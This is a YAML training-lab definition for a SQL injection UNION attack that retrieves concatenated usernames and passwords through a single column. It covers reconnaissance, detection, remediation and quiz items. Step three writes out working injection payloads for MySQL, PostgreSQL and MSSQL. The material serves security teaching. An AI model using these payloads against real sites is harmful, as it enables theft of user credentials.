# Category: SQL Injection
name: "SQL injection UNION attack, retrieving multiple values in a single column"
id: "sql-injection-union-multiple-values-001"
category: "sql_injection"
subcategory: "union_attack"
difficulty: "practitioner"
estimated_time: "45 minutes"

description: |
  This lab contains a SQL injection vulnerability in the product category filter.
  The attacker needs to retrieve multiple values (e.g., username and password)
  in a single column using a UNION attack. This is useful when the number of
  columns is limited.

learning_objectives:
  - Understand how to concatenate values in SQL
  - Use string concatenation to combine multiple columns
  - Extract data from other tables

tools:
  - Burp Suite
  - curl

prerequisites:
  - Basic understanding of SQL
  - Access to the lab environment

steps:
  - id: "step1"
    phase: "reconnaissance"
    action: "Identify the vulnerable parameter"
    commands:
      - "# Browse to the lab and select a category"
      - "# Intercept the request in Burp Suite"
    expected_output: "The category parameter is used in a SQL query"
    detection: "None"

  - id: "step2"
    phase: "exploitation"
    action: "Determine the number of columns and find a text column"
    commands:
      - "# Use ORDER BY and UNION SELECT with string literals"
    expected_output: "Column count and text column identified"
    detection: "Database error messages"

  - id: "step3"
    phase: "data_extraction"
    action: "Retrieve multiple values in a single column"
    commands:
      - "# For MySQL:"
      - "category=Gifts' UNION SELECT NULL, CONCAT(username, ':', password) FROM users--"
      - "# For PostgreSQL:"
      - "category=Gifts' UNION SELECT NULL, username || ':' || password FROM users--"
      - "# For MSSQL:"
      - "category=Gifts' UNION SELECT NULL, username + ':' + password FROM users--"
    expected_output: "Usernames and passwords concatenated in one column"
    detection: "Database logs may show unusual queries"

compliance_controls:
  - standard: "MITRE ATT&CK"
    control: "T1190"
    description: "Exploit Public-Facing Application"
  - standard: "OWASP"
    control: "A03:2021"
    description: "Injection"

detection:
  network_indicators:
    - "SQL keywords in URL parameters"
  log_indicators:
    - "Database error messages"
  endpoint_indicators:
    - "None"

remediation:
  immediate:
    - "Use parameterized queries"
    - "Restrict database user privileges"
  long_term:
    - "Implement input validation"
    - "Use an ORM"

variables:
  lab_url: "https://lab-id.web-security-academy.net"
  category_param: "category"

assessment_questions:
  - "What is string concatenation in SQL?"
  - "How do you concatenate strings in MySQL, PostgreSQL, and MSSQL?"
  - "Why would you want to retrieve multiple values in a single column?"

references:
  - url: "https://portswigger.net/web-security/sql-injection"
    title: "PortSwigger SQL Injection"
  - url: "https://www.w3schools.com/sql/sql_concat.asp"
    title: "SQL CONCAT"